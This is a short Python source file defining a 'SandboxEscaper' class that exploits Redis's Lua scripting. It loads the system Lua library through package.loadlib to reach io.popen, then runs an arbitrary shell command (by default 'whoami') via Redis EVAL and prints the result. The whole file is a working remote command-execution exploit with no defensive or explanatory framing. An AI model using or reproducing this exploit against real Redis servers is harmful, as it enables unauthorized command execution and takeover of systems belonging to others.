class SandboxEscaper:
    def __init__(self, redis_client):
        """Initialize the sandbox escaper with a RedisClient instance."""
        self.redis_client = redis_client
        self.sandbox_escape_template = 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("{payload}", "r"); local res = f:read("*a"); f:close(); return res'

    def execute(self, payload="whoami"):
        """Execute a command through Redis Lua sandbox escape."""
        if not self.redis_client.client:
            print("[ERROR] Not connected to Redis server")
            return None

        lua_script = self.sandbox_escape_template.format(payload=payload)
        print("--------------------------------")
        try:
            result = self.redis_client.client.eval(lua_script, 0)
            print(result)
        except Exception as e:
            error_message = str(e)
            print(error_message)
            result = error_message
        print("--------------------------------")

        return result
